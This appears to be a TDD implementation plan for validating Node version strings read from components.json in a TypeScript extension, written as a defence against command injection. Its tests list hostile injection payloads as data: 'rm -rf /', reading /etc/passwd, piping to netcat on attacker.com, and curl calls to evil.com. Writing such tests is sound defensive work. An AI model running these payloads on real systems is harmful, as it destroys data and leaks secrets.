# Step 3: Validate at ComponentRegistryManager Source

**Status:** ✅ Complete

## Purpose

Add nodeVersion validation at the source where component configurations are parsed from `templates/components.json`. This provides defense-in-depth by catching invalid versions early in the data flow, before they reach CommandExecutor. Prevents manual editing of components.json from introducing malicious versions.

## Prerequisites

- [ ] Step 1 completed (validateNodeVersion() function exists)
- [ ] Step 2 completed (CommandExecutor validation in place)
- [ ] All previous tests passing

## Tests to Write First

### Integration Tests (Add to existing ComponentRegistryManager test file or create new)

**Source Validation Tests:**

- [ ] **Test:** getRequiredNodeVersions() validates numeric versions
  - **Given:** components.json has valid numeric versions ("20", "22", "24")
  - **When:** getRequiredNodeVersions() is called
  - **Then:** All versions returned without error
  - **File:** `tests/features/components/services/ComponentRegistryManager.test.ts`

- [ ] **Test:** getRequiredNodeVersions() validates semantic versions
  - **Given:** components.json has valid semver ("20.11.0")
  - **When:** getRequiredNodeVersions() is called
  - **Then:** All versions returned without error
  - **File:** `tests/features/components/services/ComponentRegistryManager.test.ts`

- [ ] **Test:** getRequiredNodeVersions() rejects injection payload
  - **Given:** components.json manually edited with "20; rm -rf /"
  - **When:** getRequiredNodeVersions() is called
  - **Then:** Error thrown with validation message
  - **File:** `tests/features/components/services/ComponentRegistryManager.test.ts`

- [ ] **Test:** getRequiredNodeVersions() rejects invalid format
  - **Given:** components.json manually edited with "v20" or "latest"
  - **When:** getRequiredNodeVersions() is called
  - **Then:** Error thrown with validation message
  - **File:** `tests/features/components/services/ComponentRegistryManager.test.ts`

- [ ] **Test:** getNodeVersionToComponentMapping() validates versions
  - **Given:** Component configurations with various version formats
  - **When:** getNodeVersionToComponentMapping() is called
  - **Then:** Only valid versions included in mapping
  - **File:** `tests/features/components/services/ComponentRegistryManager.test.ts`

## Files to Create/Modify

- [ ] `src/features/components/services/ComponentRegistryManager.ts` - Add validation (~5 lines at line 239)
- [ ] `tests/features/components/services/ComponentRegistryManager.test.ts` - Add validation tests (~100 lines)

## Implementation Details

### RED Phase (Write Failing Tests First)

**Step 3.1: Add validation tests to ComponentRegistryManager test file**

Add to existing test file or create new section:

```typescript
// tests/features/components/services/ComponentRegistryManager.test.ts
// (Add to existing test file)

describe('nodeVersion security validation', () => {
    describe('getRequiredNodeVersions', () => {
        it('should accept valid numeric versions from components.json', async () => {
            // components.json currently has "20", "22", "24"
            const registryManager = new ComponentRegistryManager(extensionPath);

            const versions = await registryManager.getRequiredNodeVersions(
                'citisignal-nextjs',  // Node 24
                'adobe-commerce-paas', // Node 20
                ['commerce-mesh'],     // Node 20
                ['integration-service'] // Node 22
            );

            // Should return Set without throwing
            expect(versions.size).toBeGreaterThan(0);
            expect(versions.has('20')).toBe(true);
            expect(versions.has('22')).toBe(true);
            expect(versions.has('24')).toBe(true);
        });

        it('should accept valid semantic versions', async () => {
            // Test with component that has semantic version
            // (Would need to mock or modify test components.json)
            const registryManager = new ComponentRegistryManager(extensionPath);

            // Mock getComponentById to return component with semver
            const mockComponent = {
                id: 'test-component',
                name: 'Test Component',
                configuration: {
                    nodeVersion: '20.11.0'
                }
            };

            jest.spyOn(registryManager, 'getComponentById')
                .mockResolvedValue(mockComponent as any);

            const versions = await registryManager.getRequiredNodeVersions(
                'test-component'
            );

            expect(versions.has('20.11.0')).toBe(true);
        });

        it('should throw error for injection payload in nodeVersion', async () => {
            const registryManager = new ComponentRegistryManager(extensionPath);

            // Mock getComponentById to return component with malicious version
            const maliciousComponent = {
                id: 'malicious-component',
                name: 'Malicious Component',
                configuration: {
                    nodeVersion: '20; rm -rf /'
                }
            };

            jest.spyOn(registryManager, 'getComponentById')
                .mockResolvedValue(maliciousComponent as any);

            await expect(
                registryManager.getRequiredNodeVersions('malicious-component')
            ).rejects.toThrow(/Invalid Node version/);
        });

        it('should throw error for invalid version format', async () => {
            const registryManager = new ComponentRegistryManager(extensionPath);

            // Test with "v" prefix
            const invalidComponent1 = {
                id: 'invalid-component',
                name: 'Invalid Component',
                configuration: {
                    nodeVersion: 'v20'
                }
            };

            jest.spyOn(registryManager, 'getComponentById')
                .mockResolvedValue(invalidComponent1 as any);

            await expect(
                registryManager.getRequiredNodeVersions('invalid-component')
            ).rejects.toThrow(/Invalid Node version/);

            // Test with "latest" keyword (not in allowlist)
            const invalidComponent2 = {
                id: 'invalid-component-2',
                name: 'Invalid Component 2',
                configuration: {
                    nodeVersion: 'latest'
                }
            };

            jest.spyOn(registryManager, 'getComponentById')
                .mockResolvedValue(invalidComponent2 as any);

            await expect(
                registryManager.getRequiredNodeVersions('invalid-component-2')
            ).rejects.toThrow(/Invalid Node version/);
        });

        it('should validate all injection payloads', async () => {
            const registryManager = new ComponentRegistryManager(extensionPath);

            const injectionPayloads = [
                '20; rm -rf /',
                '20 && cat /etc/passwd',
                '20 | nc attacker.com 1234',
                '20`whoami`',
                '20$(id)',
                "20' OR '1'='1",
                '20\nrm -rf /',
                '20;$(curl evil.com)',
                '20 & curl http://evil.com',
            ];

            for (const payload of injectionPayloads) {
                const maliciousComponent = {
                    id: `malicious-${payload.substring(0, 10)}`,
                    name: 'Malicious Component',
                    configuration: {
                        nodeVersion: payload
                    }
                };

                jest.spyOn(registryManager, 'getComponentById')
                    .mockResolvedValue(maliciousComponent as any);

                await expect(
                    registryManager.getRequiredNodeVersions(`malicious-${payload.substring(0, 10)}`)
                ).rejects.toThrow(/Invalid Node version/);
            }
        });
    });

    describe('getNodeVersionToComponentMapping', () => {
        it('should validate versions in component mapping', async () => {
            const registryManager = new ComponentRegistryManager(extensionPath);

            // Mock getComponentById to return malicious component
            const maliciousComponent = {
                id: 'malicious-component',
                name: 'Malicious Component',
                configuration: {
                    nodeVersion: '20; rm -rf /'
                }
            };

            jest.spyOn(registryManager, 'getComponentById')
                .mockResolvedValue(maliciousComponent as any);

            await expect(
                registryManager.getNodeVersionToComponentMapping('malicious-component')
            ).rejects.toThrow(/Invalid Node version/);
        });

        it('should accept valid versions in mapping', async () => {
            const registryManager = new ComponentRegistryManager(extensionPath);

            const mapping = await registryManager.getNodeVersionToComponentMapping(
                'citisignal-nextjs',   // Node 24
                'adobe-commerce-paas',  // Node 20
                ['commerce-mesh'],      // Node 20
                [],
                ['integration-service'] // Node 22
            );

            // Should return mapping without throwing
            expect(Object.keys(mapping).length).toBeGreaterThan(0);
            expect(mapping['20']).toBeDefined();
            expect(mapping['22']).toBeDefined();
            expect(mapping['24']).toBeDefined();
        });
    });
});
```

**Step 3.2: Run tests to confirm they fail**

```bash
npm test -- tests/features/components/services/ComponentRegistryManager.test.ts
```

Expected: All new validation tests fail (validation not yet added).

### GREEN Phase (Minimal Implementation to Pass Tests)

**Step 3.3: Add validation to ComponentRegistryManager**

Modify `src/features/components/services/ComponentRegistryManager.ts`:

**Add import at top of file** (around line 3):

```typescript
import { validateNodeVersion } from '@/core/validation/securityValidation';
```

**Add validation in getRequiredNodeVersions()** (around line 239):

```typescript
// BEFORE (line 236-241):
if (frontendId) {
    const frontend = await this.getComponentById(frontendId);
    if (frontend?.configuration?.nodeVersion) {
        nodeVersions.add(frontend.configuration.nodeVersion);
    }
}

// AFTER (with validation):
if (frontendId) {
    const frontend = await this.getComponentById(frontendId);
    if (frontend?.configuration?.nodeVersion) {
        // SECURITY: Validate nodeVersion from components.json (defense-in-depth)
        validateNodeVersion(frontend.configuration.nodeVersion);
        nodeVersions.add(frontend.configuration.nodeVersion);
    }
}

// Apply same pattern to backend (line 244-249):
if (backendId) {
    const backend = await this.getComponentById(backendId);
    if (backend?.configuration?.nodeVersion) {
        // SECURITY: Validate nodeVersion from components.json (defense-in-depth)
        validateNodeVersion(backend.configuration.nodeVersion);
        nodeVersions.add(backend.configuration.nodeVersion);
    }
}

// Apply same pattern to dependencies loop (line 252-259):
if (dependencies) {
    for (const depId of dependencies) {
        const dep = await this.getComponentById(depId);
        if (dep?.configuration?.nodeVersion) {
            // SECURITY: Validate nodeVersion from components.json (defense-in-depth)
            validateNodeVersion(dep.configuration.nodeVersion);
            nodeVersions.add(dep.configuration.nodeVersion);
        }
    }
}

// Apply same pattern to appBuilder loop (line 262-269):
if (appBuilder) {
    for (const appId of appBuilder) {
        const app = await this.getComponentById(appId);
        if (app?.configuration?.nodeVersion) {
            // SECURITY: Validate nodeVersion from components.json (defense-in-depth)
            validateNodeVersion(app.configuration.nodeVersion);
            nodeVersions.add(app.configuration.nodeVersion);
        }
    }
}
```

**Add validation in getNodeVersionToComponentMapping()** (around line 288-326):

Apply same pattern to all nodeVersion reads in this method. Add validation before adding to mapping:

```typescript
// Example for infrastructure (line 285-291):
if (registry.infrastructure) {
    for (const infra of registry.infrastructure) {
        if (infra.configuration?.nodeVersion) {
            // SECURITY: Validate nodeVersion from components.json (defense-in-depth)
            validateNodeVersion(infra.configuration.nodeVersion);
            mapping[infra.configuration.nodeVersion] = infra.name;
        }
    }
}

// Repeat for frontend, backend, dependencies, appBuilder sections
```

**Step 3.4: Run tests to confirm they pass**

```bash
npm test -- tests/features/components/services/ComponentRegistryManager.test.ts
```

Expected: All validation tests pass.

### REFACTOR Phase (Improve Quality While Keeping Tests Green)

**Step 3.5: Improve code quality**

1. **Extract validation helper (DRY):**
   ```typescript
   // Helper method to validate and add version
   private validateAndAddVersion(
       version: string | undefined,
       versions: Set<string>,
       componentName: string
   ): void {
       if (version) {
           try {
               validateNodeVersion(version);
               versions.add(version);
           } catch (error) {
               throw new Error(
                   `Invalid Node version in component "${componentName}": ${(error as Error).message}`
               );
           }
       }
   }
   ```

2. **Use helper in all nodeVersion reads:**
   ```typescript
   if (frontend?.configuration?.nodeVersion) {
       this.validateAndAddVersion(
           frontend.configuration.nodeVersion,
           nodeVersions,
           frontend.name
       );
   }
   ```

3. **Improve error messages:**
   - Include component name in error
   - Guide user to edit components.json
   - Reference security documentation

4. **Add JSDoc comments:**
   - Document defense-in-depth strategy
   - Explain why validation at source matters
   - Reference CWE-77

**Step 3.6: Re-run all tests**

```bash
npm test -- tests/features/components/
```

Expected: All tests pass after refactoring.

**Step 3.7: Verify existing components.json**

```bash
# Manually verify components.json has valid versions
cat templates/components.json | grep nodeVersion
```

Expected: Only valid versions ("20", "22", "24") in current components.json.

## Expected Outcome

- **Validation added** in ComponentRegistryManager at 4 locations (frontend, backend, dependencies, appBuilder)
- **Import added** for validateNodeVersion
- **Helper method** created to DRY up validation logic
- **Enhanced error messages** include component name
- **All tests passing** including new validation tests
- **Existing components.json** validated (all current values are valid)

## Acceptance Criteria

- [ ] validateNodeVersion() called in getRequiredNodeVersions() (4 locations)
- [ ] validateNodeVersion() called in getNodeVersionToComponentMapping() (5 locations)
- [ ] Import added for validateNodeVersion at top of file
- [ ] Helper method created to DRY up validation (optional but recommended)
- [ ] Error messages include component name context
- [ ] All injection payloads rejected at source
- [ ] All valid formats accepted
- [ ] Existing components.json passes validation
- [ ] All ComponentRegistryManager tests passing
- [ ] JSDoc comments added explaining defense-in-depth

## Estimated Time

**0.5 hours**

- RED Phase: 15 minutes (write validation tests)
- GREEN Phase: 10 minutes (add validation at 9 locations)
- REFACTOR Phase: 5 minutes (extract helper, improve messages)
- Verification: 5 minutes (run tests, verify components.json)

---

**Final Steps After Step 3:**

1. **Run full test suite:**
   ```bash
   npm test
   ```

2. **Check test coverage:**
   ```bash
   npm test -- --coverage
   ```

3. **Verify acceptance criteria:**
   - [ ] All 9 injection payloads blocked
   - [ ] All valid formats accepted
   - [ ] 100% coverage for validateNodeVersion()
   - [ ] No regressions in existing tests

4. **Security review:**
   - Request security agent review
   - Verify regex covers all shell metacharacters
   - Confirm defense-in-depth strategy

5. **Breaking change audit:**
   - Review 27 call sites for useNodeVersion
   - Verify all use valid version formats
   - Document any breaking changes

---

_Implementation complete after Step 3_
_Ready for Efficiency Review → Security Review → Deployment_
